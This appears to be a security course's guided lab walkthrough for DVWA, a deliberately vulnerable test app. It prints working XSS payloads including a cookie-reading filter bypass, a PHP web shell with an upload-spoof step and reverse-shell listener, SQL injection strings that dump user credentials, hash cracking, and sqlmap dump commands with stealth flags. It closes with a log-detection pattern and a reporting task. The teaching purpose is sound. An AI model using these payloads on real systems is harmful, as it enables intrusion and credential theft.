---
session: 8
title: Web Application Hacking & SQL Injection — Guided Lab Walkthrough
---

# Session 8 — Guided Lab Walkthrough

> DVWA / your own lab only. Delete any uploaded webshell at session end.

## Setup
```bash
# stand up DVWA (Docker) on the lab network:
docker run --rm -it -p 80:80 vulnerables/web-dvwa
# browse to http://LABIP/ , login admin/password, Create/Reset Database
# set browser proxy to 127.0.0.1:8080 and run Burp (or Burp's embedded browser)
```

## Lab A — XSS
```
# Reflected (DVWA XSS Reflected, Low), in the name field:
<script>alert(document.domain)</script>
# delivery URL:  http://DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>
# Stored (XSS Stored) guestbook message:
<script>alert('stored-'+document.domain)</script>     # reload -> fires again
# Beat Medium's filter (strips <script>):
<img src=x onerror=alert(document.cookie)>            # or <svg onload=alert(1)>
```

## Lab B — File upload → shell
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
# upload via DVWA File Upload (Low). On Medium, intercept in Burp and set
#   Content-Type: image/jpeg   (spoof), keep filename shell.php
curl 'http://DVWA/hackable/uploads/shell.php?c=id'     # uid=33(www-data)
# upgrade: php-reverse-shell.php -> nc -lvnp 4444
```

## Lab C — Manual SQLi (DVWA SQL Injection, Low; id field)
```sql
1' ORDER BY 2 -- -                    -- 2 columns (error at 3)
1' UNION SELECT 1,2 -- -              -- which columns print
1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() -- -
1' UNION SELECT user,password FROM users -- -       -- dump creds
-- take the md5 hashes to:  hashcat -m 0 hashes.txt rockyou.txt
```

## Lab D — sqlmap + verify
```bash
# save the request from Burp (keeps cookies), then:
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D dvwa -T users --dump          # matches Lab C
# blind target (DVWA SQL Injection Blind):
sqlmap -r blind_request.txt --batch --technique=BT -D dvwa -T users --dump
# tune for stealth:  --delay=1 --random-agent --level=2
```

## Lab E — Detect + report
```bash
# detection over the access log (your own attack traffic is the test data):
grep -Ei "union select|information_schema|' or '1'='1|sleep\(" /var/log/apache2/access.log
```
Then fill `exercises/session-08/web_finding_report_template.md`: per finding — title + OWASP category, severity, affected endpoint/parameter, evidence, impact, remediation; ranked by risk.
